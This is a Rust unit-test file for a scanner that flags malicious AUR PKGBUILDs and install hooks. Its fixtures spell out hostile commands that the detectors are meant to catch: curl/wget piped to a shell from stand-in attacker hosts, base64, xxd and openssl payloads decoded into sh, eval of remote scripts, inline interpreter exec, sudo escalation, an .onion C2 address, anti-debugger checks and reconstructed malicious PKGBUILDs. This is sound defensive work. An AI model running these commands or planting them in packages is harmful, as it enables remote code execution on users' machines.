//! Unit tests for `security` (kept out of the module file so the code stays readable).

use super::*;

#[test]
fn curl_pipe_sh_detected() {
    assert!(is_curl_pipe_shell(
        "curl -sSL https://evil.example.com/x | sh"
    ));
    assert!(is_curl_pipe_shell(
        "wget -qO- http://evil.example.com/x | bash"
    ));
    assert!(!is_curl_pipe_shell(
        "curl -sSL https://example.com/x -o file.tar.gz"
    ));
    assert!(!is_curl_pipe_shell("# curl foo | sh (just a comment)"));
}

// ── base64 -d | sh / xxd -r -p | bash / source <(curl ...) ──────────

#[test]
fn base64_pipe_shell_detected() {
    assert!(is_base64_pipe_shell("base64 -d payload.b64 | sh"));
    assert!(is_base64_pipe_shell(
        "echo \"$PAYLOAD\" | base64 --decode | bash"
    ));
    assert!(is_base64_pipe_shell("base64 -d payload.b64 | env bash"));
    // decoding alone (no shell on the receiving end) already gets
    // flagged by is_base64_decode above -- this check specifically
    // wants the pipe-into-shell case
    assert!(!is_base64_pipe_shell(
        "base64 -d payload.b64 -o payload.bin"
    ));
    assert!(!is_base64_pipe_shell("base64 -d payload.b64 | tee out.bin"));
    assert!(!is_base64_pipe_shell("# base64 -d payload.b64 | sh"));
}

#[test]
fn xxd_pipe_shell_detected() {
    assert!(is_xxd_pipe_shell("xxd -r -p payload.hex | bash"));
    assert!(is_xxd_pipe_shell("xxd -rp payload.hex | sh"));
    assert!(is_xxd_pipe_shell("cat payload.hex | xxd -p -r | zsh"));
    // -r without -p (default xxd hexdump-with-offsets format) or no
    // pipe into a shell at all must not flag
    assert!(!is_xxd_pipe_shell("xxd -r dump.hex | sh"));
    assert!(!is_xxd_pipe_shell("xxd -r -p payload.hex -o payload.bin"));
    assert!(!is_xxd_pipe_shell("# xxd -r -p payload.hex | bash"));
}

#[test]
fn source_process_subst_detected() {
    assert!(is_source_process_subst(
        "source <(curl -sSL https://evil.example.com/x)"
    ));
    assert!(is_source_process_subst(
        ". <(wget -qO- http://evil.example.com/x)"
    ));
    // process substitution not fed to source/. shouldn't flag
    assert!(!is_source_process_subst(
        "diff <(curl -sSL https://evil.example.com/x) file.txt"
    ));
    assert!(!is_source_process_subst("source ./helpers.sh"));
    assert!(!is_source_process_subst(
        "# source <(curl https://evil.example.com/x)"
    ));
}

#[test]
fn decode_pipe_shell_and_process_subst_flagged_in_full_scan() {
    let pkgbuild = r#"
pkgname=totally-legit-tool
pkgver=1.2.3
build() {
  base64 -d payload.b64 | bash
  source <(curl -sSL https://evil.example.com/stage2)
}
"#;
    let findings = scan_pkgbuild_source(pkgbuild);
    assert!(findings
        .iter()
        .any(|f| f.message.contains("base64/hex-encoded blob")));
    assert!(findings
        .iter()
        .any(|f| f.message.contains("process substitution")));
}

#[test]
fn base64_decode_detected() {
    assert!(is_base64_decode("echo $PAYLOAD | base64 -d | bash"));
    assert!(is_base64_decode("base64 --decode < blob.txt > out"));
    assert!(!is_base64_decode("makepkg --version"));
}

#[test]
fn chmod_777_detected() {
    assert!(is_chmod_777("chmod 777 \"$pkgdir/usr/bin/foo\""));
    assert!(is_chmod_777("chmod -R 777 build/"));
    assert!(!is_chmod_777("chmod 755 \"$pkgdir/usr/bin/foo\""));
}

#[test]
fn raw_ipv4_detected() {
    assert!(contains_raw_ipv4(
        "source=(\"http://185.220.101.5/payload.sh\")"
    ));
    assert!(contains_raw_ipv4("192.168.1.1"));
    assert!(!contains_raw_ipv4(
        "source=(\"https://github.com/foo/bar/releases/download/v1.2.3/foo.tar.gz\")"
    ));
    assert!(!contains_raw_ipv4("no ip here at all"));
    // Known false positive, documented on contains_raw_ipv4: a 4-part
    // dotted version where every part is <= 255 reads as an IP too.
    assert!(contains_raw_ipv4("pkgver=1.2.3.4"));
}

#[test]
fn clean_pkgbuild_has_no_findings() {
    let src = r#"
pkgname=foo
pkgver=1.2.3
pkgrel=1
source=("https://github.com/foo/foo/archive/v$pkgver.tar.gz")
sha256sums=('abc123')
build() {
  cd "$pkgname-$pkgver"
  make
}
package() {
  cd "$pkgname-$pkgver"
  make DESTDIR="$pkgdir" install
}
"#;
    assert!(scan_pkgbuild_source(src).is_empty());
}

#[test]
fn top_level_command_substitution_flagged_in_full_scan() {
    // the real repro: a markdown code-span backtick left in pkgdesc,
    // pasted from a GitHub README - runs the literal command `bwrap`
    // (no args) the instant anything sources this PKGBUILD, before
    // build() or the sandbox are anywhere in the picture.
    let pkgbuild = "pkgname=aura-emerge\npkgver=2.1.4\npkgdesc=\"runs untrusted build steps inside a `bwrap` sandbox.\"\npkgrel=1\n";
    let findings = scan_pkgbuild_source(pkgbuild);
    assert!(findings
        .iter()
        .any(|f| f.message.contains("command substitution")));

    // same construct inside a function body (only runs when makepkg
    // actually calls that function) must NOT flag.
    let pkgver_func =
        "pkgname=foo\npkgver() {\n  cd \"$srcdir\"\n  git describe --long | sed 's/^v//'\n}\n";
    assert!(scan_pkgbuild_source(pkgver_func).is_empty());
}

#[test]
fn sandbox_evasion_detected() {
    assert!(has_sandbox_evasion("grep TracerPid /proc/self/status"));
    assert!(has_sandbox_evasion(
        "cat /proc/self/status | grep -i tracer"
    ));
    assert!(has_sandbox_evasion(
        r#"if [ -n "$LD_PRELOAD" ]; then exit 0; fi"#
    ));
    assert!(has_sandbox_evasion("env | grep -i ld_library_path"));
    assert!(has_sandbox_evasion(
        r#"if printenv LD_PRELOAD >/dev/null; then quit; fi"#
    ));
    // Commented out - must not flag.
    assert!(!has_sandbox_evasion(
        "# check TracerPid in /proc/self/status"
    ));
    // Legitimate: setting the var for the build's own linking, not
    // reading it back to branch on - must not flag.
    assert!(!has_sandbox_evasion(
        r#"export LD_LIBRARY_PATH="$srcdir/lib:$LD_LIBRARY_PATH""#
    ));
    assert!(!has_sandbox_evasion(
        r#"export LD_PRELOAD="$srcdir/libfakeasan.so""#
    ));
    // Unrelated use of "env" - must not flag.
    assert!(!has_sandbox_evasion("env FOO=bar ./configure"));
}

#[test]
fn sandbox_evasion_flagged_in_full_scan() {
    let src = "pkgname=foo\nbuild() {\n  if grep -q TracerPid /proc/self/status; then\n    return 0\n  fi\n  do_real_payload\n}\n";
    let findings = scan_pkgbuild_source(src);
    assert!(findings
        .iter()
        .any(|f| f.message.contains("TracerPid") || f.message.contains("anti-debugger")));
}

#[test]
fn validpgpkeys_single_line() {
    let src = "validpgpkeys=('ABCDEF0123456789ABCDEF0123456789ABCDEF01')";
    assert_eq!(
        parse_validpgpkeys(src),
        vec!["ABCDEF0123456789ABCDEF0123456789ABCDEF01"]
    );
}

#[test]
fn validpgpkeys_multi_line_mixed_quotes() {
    let src = "validpgpkeys=('AAAA0123456789ABCDEF0123456789ABCDEF0123'\n              \"BBBB0123456789ABCDEF0123456789ABCDEF0123\")\n";
    assert_eq!(
        parse_validpgpkeys(src),
        vec![
            "AAAA0123456789ABCDEF0123456789ABCDEF0123",
            "BBBB0123456789ABCDEF0123456789ABCDEF0123"
        ]
    );
}

#[test]
fn validpgpkeys_absent() {
    assert!(parse_validpgpkeys("pkgname=foo\npkgver=1.0\n").is_empty());
}

#[test]
fn known_malicious_package_detected() {
    assert_eq!(
        contains_known_malicious_package("npm install atomic-lockfile"),
        Some("atomic-lockfile")
    );
    assert_eq!(
        contains_known_malicious_package("bun install js-digest"),
        Some("js-digest")
    );
    assert_eq!(
        contains_known_malicious_package("npm install typescript"),
        None
    );
}

#[test]
fn decoy_tool_binary_detected() {
    // Real August-2026-wave shape: install a bundled ELF under a
    // generic build-tool name.
    assert!(has_decoy_tool_binary(
        r#"install -Dm755 "$srcdir/linter" "$pkgdir/usr/bin/linter""#
    ));
    assert!(has_decoy_tool_binary(
        r#"install -Dm755 hasher "$pkgdir/usr/bin/hasher""#
    ));
    assert!(has_decoy_tool_binary(
        "chmod +x \"$pkgdir/usr/bin/validator\""
    ));
    assert!(has_decoy_tool_binary("chmod 755 $pkgdir/usr/bin/optimizer"));
    // Commented out - must not flag.
    assert!(!has_decoy_tool_binary(
        "# install -Dm755 validator /usr/bin/validator"
    ));
    // Unrelated install (docs, not an executable under a decoy name).
    assert!(!has_decoy_tool_binary(
        r#"install -Dm644 "$pkgdir/usr/share/doc/README""#
    ));
    // Substring of the decoy name, not the name itself - must not flag.
    assert!(!has_decoy_tool_binary(
        r#"install -Dm755 validators.conf "$pkgdir/etc/validators.conf""#
    ));
    // A legitimate binary install under an unrelated name - must not flag.
    assert!(!has_decoy_tool_binary(
        r#"install -Dm755 "$srcdir/aura-emerge" "$pkgdir/usr/bin/aura-emerge""#
    ));
}

#[test]
fn decoy_tool_binary_flagged_in_full_scan() {
    let src = "build() {\n  install -Dm755 \"$srcdir/minifier\" \"$pkgdir/usr/bin/minifier\"\n}\n";
    let findings = scan_pkgbuild_source(src);
    assert!(findings
        .iter()
        .any(|f| f.message.contains("generic build-tool name")));
}

#[test]
fn known_compromised_package_name_detected() {
    assert!(is_known_compromised_package("archutil"));
    assert!(is_known_compromised_package("openconnect-sso"));
    assert!(is_known_compromised_package("StorageExplorer-Bin")); // case-insensitive
                                                                  // Not a substring match - a lookalike/unrelated name must not flag.
    assert!(!is_known_compromised_package("archutil2"));
    assert!(!is_known_compromised_package("my-archutil-fork"));
    assert!(!is_known_compromised_package("firefox"));
}

#[test]
fn known_compromised_package_name_flagged_via_scan_report() {
    // `--scan`/`--install-pkgbuild --scan` go through `scan_report`,
    // a separate entry point from the install-time
    // `scan_aur_pkgbuilds_or_abort` - make sure the name check fires
    // there too, on a totally clean PKGBUILD body.
    let clean = "pkgname=archutil\npkgver=1.0\npkgrel=1\nbuild() {\n  make\n}\n";
    assert!(!scan_report("archutil", clean, None, None));
    assert!(scan_report("firefox", clean, None, None));
}

#[test]
fn foreign_pkg_manager_install_detected() {
    assert!(is_foreign_pkg_manager_install(
        "npm install atomic-lockfile"
    ));
    assert!(is_foreign_pkg_manager_install("bun add js-digest"));
    assert!(is_foreign_pkg_manager_install("pip install requests"));
    // Local/project installs - no named external package - must NOT flag.
    assert!(!is_foreign_pkg_manager_install("npm install"));
    assert!(!is_foreign_pkg_manager_install("npm ci"));
    assert!(!is_foreign_pkg_manager_install("npm install ."));
    assert!(!is_foreign_pkg_manager_install("npm install --production"));
    assert!(!is_foreign_pkg_manager_install(
        "yarn add ./vendor/local-pkg"
    ));
    // Value-taking flags: the flag's argument isn't the package name.
    assert!(!is_foreign_pkg_manager_install(
        "npm install --cache \"$srcdir/npm-cache\""
    ));
    assert!(!is_foreign_pkg_manager_install(
        "pip install -r requirements.txt"
    ));
    // A real named package after a value-taking flag must still be caught.
    assert!(is_foreign_pkg_manager_install(
        "npm install --registry https://registry.npmjs.org left-pad"
    ));
    assert!(is_foreign_pkg_manager_install("npm install -g typescript"));
    // Regression: a flag NOT in the verified value-taking list must
    // never eat the next token, or a real package name could hide
    // behind it (e.g. a boolean flag wrongly treated as value-taking).
    assert!(is_foreign_pkg_manager_install(
        "npm install --global-style evil-pkg"
    ));
    assert!(is_foreign_pkg_manager_install(
        "npm install --save-exact evil-pkg"
    ));
    assert!(is_foreign_pkg_manager_install(
        "pip install --user evil-pkg"
    ));
}

#[test]
fn parse_install_filename_variants() {
    assert_eq!(
        parse_install_filename("pkgname=foo\ninstall=foo.install\npkgver=1.0"),
        Some("foo.install".to_string())
    );
    assert_eq!(
        parse_install_filename("install='foo.install'"),
        Some("foo.install".to_string())
    );
    assert_eq!(parse_install_filename("# install=foo.install"), None);
    assert_eq!(parse_install_filename("pkgname=foo\npkgver=1.0"), None);
}

#[test]
fn parse_install_filename_ignores_trailing_inline_comment() {
    // the real repro: an inline comment on the install= line (even one
    // that re-mentions ${pkgname}, as a copy-pasted note might) used to
    // get glued onto the value, producing a filename that could never
    // exist on disk - the .install hook then silently never got read
    // or scanned, with no error anywhere.
    assert_eq!(
        parse_install_filename("install=foo.install   # some comment"),
        Some("foo.install".to_string())
    );
    assert_eq!(
        parse_install_filename("install=${pkgname}.install   # note: mentions ${pkgname} again"),
        Some("${pkgname}.install".to_string())
    );
    assert_eq!(
        resolve_install_filename(
            "pkgname=scaner-test\ninstall=${pkgname}.install                                                   # тест интерполяции ${pkgname}\n"
        ),
        Some("scaner-test.install".to_string())
    );
    // a quoted value keeps a '#' that's actually inside the quotes
    assert_eq!(
        parse_install_filename("install=\"foo#bar.install\"  # trailing comment"),
        Some("foo#bar.install".to_string())
    );
}

#[test]
fn simple_var_ignores_trailing_inline_comment() {
    assert_eq!(
        simple_var("pkgname=foo   # the package name", "pkgname"),
        Some("foo".to_string())
    );
    assert_eq!(
        simple_var("pkgdesc=\"a #1 package\"  # comment", "pkgdesc"),
        Some("a #1 package".to_string())
    );
    assert_eq!(
        simple_var("pkgname=(a b)  # split package", "pkgname"),
        None
    );
}

#[test]
fn hex_escape_payload_detected() {
    assert!(is_hex_escape_payload(
        r#"printf '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90' > /tmp/x"#
    ));
    // Legitimate hex doesn't use \x escapes: checksums, fingerprints, hashes.
    assert!(!is_hex_escape_payload(
        "sha256sums=('deadbeefcafebabe0011223344556677889900112233445566778899aabbcc')"
    ));
    assert!(!is_hex_escape_payload(
        "validpgpkeys=('ABCDEF0123456789ABCDEF0123456789ABCDEF01')"
    ));
    assert!(!is_hex_escape_payload(
        "commit=1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b"
    ));
    // A couple of stray \x escapes (e.g. one ANSI color code) shouldn't trip it.
    assert!(!is_hex_escape_payload(r#"echo -e '\x1b[32mgreen\x1b[0m'"#));
}

#[test]
fn strip_version_operator_variants() {
    assert_eq!(strip_version_operator("glibc>=2.38"), "glibc");
    assert_eq!(strip_version_operator("libc.so=6-64"), "libc.so");
    assert_eq!(strip_version_operator("bash"), "bash");
    assert_eq!(strip_version_operator("foo<=1.2"), "foo");
    assert_eq!(strip_version_operator("foo<1.2"), "foo");
}

#[test]
fn parse_depends_on_basic() {
    let qi = "\
Name            : bash
Version         : 5.2.32-1
Description     : The GNU Bourne Again shell
Depends On      : readline  libc.so=6-64
Optional Deps   : None
Required By     : filesystem

Name            : coreutils
Version         : 9.5-1
Depends On      : glibc>=2.38  acl  attr
Required By     : base

Name            : filesystem
Version         : 2024.01-1
Depends On      : None
Required By     : None
";
    let deps = parse_depends_on_all(qi);
    for expect in ["readline", "libc.so", "glibc", "acl", "attr"] {
        assert!(deps.contains(expect), "missing: {}", expect);
    }
    assert_eq!(deps.len(), 5);
}

#[test]
fn parse_depends_on_wrapped_continuation() {
    // Simulates pacman wrapping a long Depends On value onto a second,
    // indented line with no field label.
    let qi = "\
Name            : bigpkg
Version         : 1.0-1
Depends On      : dep-one  dep-two  dep-three
              dep-four  dep-five
Required By     : None
";
    let deps = parse_depends_on_all(qi);
    for expect in ["dep-one", "dep-two", "dep-three", "dep-four", "dep-five"] {
        assert!(deps.contains(expect), "missing: {}", expect);
    }
    assert_eq!(deps.len(), 5);
}

#[test]
fn parse_depends_on_none_and_missing_field() {
    let qi = "\
Name            : justapkg
Version         : 1.0-1
Depends On      : None
Required By     : None
";
    assert!(parse_depends_on_all(qi).is_empty());
}

#[test]
fn atomic_arch_style_pkgbuild_and_install_flagged() {
    let pkgbuild = r#"
pkgname=totally-legit-tool
pkgver=1.2.3
pkgrel=1
install=totally-legit-tool.install
source=("https://github.com/foo/totally-legit-tool/archive/v$pkgver.tar.gz")
build() {
  cd "$pkgname-$pkgver"
  make
}
"#;
    let install_hook = r#"
post_install() {
  npm install atomic-lockfile
}
"#;
    let pkgbuild_findings = scan_pkgbuild_source(pkgbuild);
    assert!(
        pkgbuild_findings.is_empty(),
        "clean PKGBUILD should have no findings on its own"
    );

    assert_eq!(
        parse_install_filename(pkgbuild),
        Some("totally-legit-tool.install".to_string())
    );

    let install_findings = scan_pkgbuild_source(install_hook);
    assert!(install_findings
        .iter()
        .any(|f| f.message.contains("atomic-lockfile")));
    assert!(install_findings
        .iter()
        .any(|f| f.severity == Severity::ConfirmedIoc));
}

#[test]
fn findings_carry_correct_line_numbers() {
    let src = "pkgname=foo\npkgver=1.0\nbuild() {\n  chmod 777 \"$pkgdir\"\n}\n";
    let findings = scan_pkgbuild_source(src);
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].line, 4);
    assert_eq!(findings[0].severity, Severity::Suspicious);
}

#[test]
fn known_malicious_package_is_atomic_arch_severity() {
    let src = "post_install() {\n  npm install atomic-lockfile\n}\n";
    let findings = scan_pkgbuild_source(src);
    // Hits both the exact-IOC check (AtomicArch) and the generic
    // foreign-package-manager heuristic (Suspicious) on the same line.
    assert!(findings
        .iter()
        .any(|f| f.severity == Severity::ConfirmedIoc && f.line == 2));
    assert!(findings
        .iter()
        .any(|f| f.severity == Severity::Suspicious && f.line == 2));
}

#[test]
fn malicious_pkgbuild_flagged() {
    let src = r#"
pkgname=evil
build() {
  curl -sSL http://185.220.101.5/stage2.sh | bash
  chmod 777 /tmp/evil
}
"#;
    let findings = scan_pkgbuild_source(src);
    assert_eq!(findings.len(), 3);
}

// ── 2018 acroread/balz/minergate takeover ───────────────────────────
//
// Real incident: a hijacked orphaned AUR package fetched a persistence
// script from a Pastebin raw URL and, once run, dropped a literal
// `compromised.txt` marker into every home directory. Covered here by
// two independent heuristics: the paste-site fetch (Suspicious, since
// the mechanism alone has some legitimate uses) and the marker
// filename itself (ConfirmedIoc, since there's no legitimate reason
// for a PKGBUILD to reference it at all).

#[test]
fn paste_site_fetch_detected() {
    assert!(is_paste_site_fetch(
        "curl -s https://pastebin.com/raw/AbCd1234 -o stage2.sh"
    ));
    assert!(is_paste_site_fetch("wget -qO- https://ix.io/abcd | bash"));
    assert!(is_paste_site_fetch("curl https://0x0.st/xyz.sh"));
    assert!(!is_paste_site_fetch(
        "curl -sSL https://github.com/foo/bar/releases/download/v1/foo.tar.gz"
    ));
    assert!(!is_paste_site_fetch(
        "# curl https://pastebin.com/raw/AbCd1234 (just a comment)"
    ));
    // Mentioning a paste site without an actual fetch verb shouldn't fire.
    assert!(!is_paste_site_fetch(
        "# see https://pastebin.com/raw/AbCd1234 for context"
    ));
}

#[test]
fn compromised_marker_detected() {
    assert!(has_compromised_marker("touch /compromised.txt"));
    assert!(has_compromised_marker(
        "echo pwned > \"$HOME/compromised.txt\""
    ));
    assert!(!has_compromised_marker(
        "# compromised.txt was the 2018 marker file (comment only)"
    ));
    assert!(!has_compromised_marker("this file is totally fine"));
}

#[test]
fn acroread_2018_style_pkgbuild_flagged() {
    // Reconstructed shape of the real 2018 payload: fetch a script off
    // Pastebin and pipe it into the shell, which then drops the marker
    // file. Should trip curl-pipe-shell (Suspicious), paste-site-fetch
    // (Suspicious), and - since the marker also happens to appear in
    // this build() - the exact-IOC check (ConfirmedIoc).
    let src = r#"
pkgname=acroread
build() {
  curl -sSL https://pastebin.com/raw/deadbeef | bash
  echo pwned > /compromised.txt
}
"#;
    let findings = scan_pkgbuild_source(src);
    assert!(findings
        .iter()
        .any(|f| f.severity == Severity::ConfirmedIoc && f.message.contains("compromised.txt")));
    assert!(findings
        .iter()
        .any(|f| f.message.contains("paste-dump site")));
    assert!(findings
        .iter()
        .any(|f| f.message.contains("curl/wget | sh")));
}

// ── Jul/Aug 2026 openconnect-sso-anchored wave ──────────────────────
//
// Reported mechanism: a compromised package's build path added a
// binary named `validator` and executed it with `sudo` during
// packaging, reusing Tor-backed second-stage delivery from the June
// 2026 Atomic Arch campaign.

#[test]
fn sudo_escalation_detected() {
    assert!(is_sudo_escalation("sudo ./validator --init"));
    assert!(is_sudo_escalation("pkexec /tmp/helper"));
    assert!(is_sudo_escalation("doas sh -c 'id'"));
    // Declaring sudo as a dependency, not invoking it, must not flag.
    assert!(!is_sudo_escalation("makedepends=('sudo')"));
    assert!(!is_sudo_escalation("depends=('sudo' 'other')"));
    assert!(!is_sudo_escalation("# sudo ./validator (just a comment)"));
    assert!(!is_sudo_escalation("build() {\n  make\n}"));
}

#[test]
fn onion_address_detected() {
    assert!(is_onion_address(
        "source=(\"http://p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd.onion/stage2\")"
    ));
    assert!(is_onion_address("C2=abc123def456.onion"));
    assert!(!is_onion_address(
        "# see the project's .onion mirror in the wiki (comment only)"
    ));
    assert!(!is_onion_address(
        "source=(\"https://github.com/foo/bar/archive/v1.tar.gz\")"
    ));
}

#[test]
fn known_malicious_hash_detected() {
    assert_eq!(
        contains_known_malicious_hash(
            "sha256sums=('e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77')"
        ),
        Some("e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77")
    );
    assert_eq!(
        contains_known_malicious_hash(
            "sha256sums=('deadbeefcafebabe0011223344556677889900112233445566778899aabbcc')"
        ),
        None
    );
}

#[test]
fn openconnect_sso_style_pkgbuild_flagged() {
    // Reconstructed shape of the reported incident: an adopted
    // package's build() gains a bundled `validator` binary and runs
    // it with sudo. Should trip the sudo-escalation heuristic
    // (Suspicious) - no ConfirmedIoc here since the binary name alone
    // isn't a matchable exact indicator, only the behavior is.
    let pkgbuild = r#"
pkgname=openconnect-sso
pkgver=0.13.0
pkgrel=2
source=("https://github.com/vlaci/openconnect-sso/archive/v$pkgver.tar.gz"
    "validator")
build() {
  cd "$pkgname-$pkgver"
  sudo ./validator --setup
  make
}
"#;
    let findings = scan_pkgbuild_source(pkgbuild);
    assert!(findings
        .iter()
        .any(|f| f.severity == Severity::Suspicious && f.message.contains("sudo/pkexec/doas")));
}

// ── absolute-path / env-wrapped shell in curl|sh (gap fix) ──────────

#[test]
fn curl_pipe_absolute_path_shell_detected() {
    assert!(is_curl_pipe_shell(
        "wget -O- https://evil.example.com/x | /bin/sh"
    ));
    assert!(is_curl_pipe_shell(
        "curl -sL https://evil.example.com/x | /usr/bin/bash"
    ));
    assert!(is_curl_pipe_shell(
        "wget -qO- https://evil.example.com/x | env bash"
    ));
    assert!(is_curl_pipe_shell(
        "curl -sL https://evil.example.com/x | env -S sh"
    ));
    // still shouldn't false-positive on a plain download-to-file
    assert!(!is_curl_pipe_shell(
        "curl -sSL https://example.com/x -o /usr/bin/foo"
    ));
}

// ── eval $(curl ...) ──────────────────────────────────────────────

#[test]
fn eval_remote_exec_detected() {
    assert!(is_eval_remote_exec(
        r#"eval "$(curl -sSL https://evil.example.com/x)""#
    ));
    assert!(is_eval_remote_exec(
        "eval `wget -qO- https://evil.example.com/x`"
    ));
    // bare eval on a local variable/array must not flag
    assert!(!is_eval_remote_exec("eval \"${some_array[@]}\""));
    assert!(!is_eval_remote_exec(
        "# eval \"$(curl https://evil.example.com/x)\" (comment)"
    ));
}

// ── python -c exec/eval + openssl decrypt ────────────────────────────

#[test]
fn python_inline_exec_detected() {
    assert!(is_python_inline_exec(
        "python3 -c \"import base64,os; exec(base64.b64decode(os.environ['P']))\""
    ));
    assert!(is_python_inline_exec("python -c 'os.system(\"id\")'"));
    // python -c doing something benign shouldn't flag
    assert!(!is_python_inline_exec("python3 -c 'print(1+1)'"));
    assert!(!is_python_inline_exec("python3 setup.py build"));
}

#[test]
fn perl_inline_exec_detected() {
    assert!(is_perl_inline_exec(r#"perl -e 'system("id")'"#));
    assert!(is_perl_inline_exec(r#"perl -E 'exec "/bin/sh"'"#));
    assert!(!is_perl_inline_exec(r#"perl -pe 's/foo/bar/'"#));
    assert!(!is_perl_inline_exec("perl Makefile.PL"));
    assert!(!is_perl_inline_exec("# perl -e 'system(id)'"));
}

#[test]
fn ruby_node_lua_inline_exec_detected() {
    assert!(ruby_inline_exec_line(r#"ruby -e 'system("id")'"#));
    assert!(!ruby_inline_exec_line(r#"ruby -e 'puts 1'"#));
    assert!(node_inline_exec_line(
        r#"node -e 'require("child_process").exec("id")'"#
    ));
    assert!(!node_inline_exec_line(r#"node -e 'console.log(1)'"#));
    assert!(lua_inline_exec_line(r#"lua -e 'os.execute("id")'"#));
    assert!(!lua_inline_exec_line(r#"lua -e 'print(1)'"#));
    assert!(!ruby_inline_exec_line("# ruby -e 'system(id)'"));
}

#[test]
fn openssl_decrypt_detected() {
    assert!(is_openssl_decrypt(
        "openssl enc -d -aes-256-cbc -in payload.enc -k \"$KEY\" | sh"
    ));
    assert!(is_openssl_decrypt(
        "openssl aes-256-cbc -d -in blob -out out"
    ));
    // encrypting (not decrypting) or unrelated openssl calls shouldn't flag
    assert!(!is_openssl_decrypt(
        "openssl enc -aes-256-cbc -in payload -out payload.enc"
    ));
    assert!(!is_openssl_decrypt("openssl dgst -sha256 foo.tar.gz"));
}

// ── install=${pkgname}.install resolution ────────────────────────────

#[test]
fn resolve_install_filename_interpolated() {
    let src = "pkgname=foo\ninstall=${pkgname}.install\npkgver=1.0\n";
    assert_eq!(
        resolve_install_filename(src),
        Some("foo.install".to_string())
    );

    let src2 = "pkgname=bar\ninstall=$pkgname.install\npkgver=1.0\n";
    assert_eq!(
        resolve_install_filename(src2),
        Some("bar.install".to_string())
    );
}

#[test]
fn resolve_install_filename_literal_unchanged() {
    let src = "pkgname=foo\ninstall=custom-hook.install\n";
    assert_eq!(
        resolve_install_filename(src),
        Some("custom-hook.install".to_string())
    );
}

#[test]
fn resolve_install_filename_pkgbase_split_package() {
    let src = "pkgbase=mysuite\npkgname=(mysuite-a mysuite-b)\ninstall=${pkgbase}.install\n";
    assert_eq!(
        resolve_install_filename(src),
        Some("mysuite.install".to_string())
    );
}

#[test]
fn resolve_install_filename_unresolvable_bails() {
    // pkgname is an array (split package) and install= references it -
    // no single value to substitute, must return None rather than a
    // garbage filename that would 404 anyway.
    let src = "pkgname=(a b)\ninstall=${pkgname}.install\n";
    assert_eq!(resolve_install_filename(src), None);
}

#[test]
fn atomic_arch_style_pkgbuild_with_interpolated_install_still_caught() {
    // Same shape as atomic_arch_style_pkgbuild_and_install_flagged above,
    // but with the realistic ${pkgname}.install form instead of the
    // literal name - this is the case that used to silently skip the
    // install hook entirely.
    let pkgbuild = r#"
pkgname=totally-legit-tool
pkgver=1.2.3
pkgrel=1
install=${pkgname}.install
source=("https://github.com/foo/totally-legit-tool/archive/v$pkgver.tar.gz")
build() {
  cd "$pkgname-$pkgver"
  make
}
"#;
    assert_eq!(
        resolve_install_filename(pkgbuild),
        Some("totally-legit-tool.install".to_string())
    );
}

#[test]
fn ast_catches_concatenation_evasion_line_heuristic_would_miss() {
    // `s""h` is bash string concatenation for the literal shell name
    // "sh" at runtime, but no single token in the source text equals
    // "sh" for a naive line-based grep to match. The AST path (tried
    // first in scan_pkgbuild_source) resolves the concatenation and
    // still catches it.
    let src = "curl -sSL https://evil.example.com/x | s\"\"h\n";
    let findings = scan_pkgbuild_source(src);
    assert!(findings
        .iter()
        .any(|f| f.message.contains("curl/wget | sh")));
}
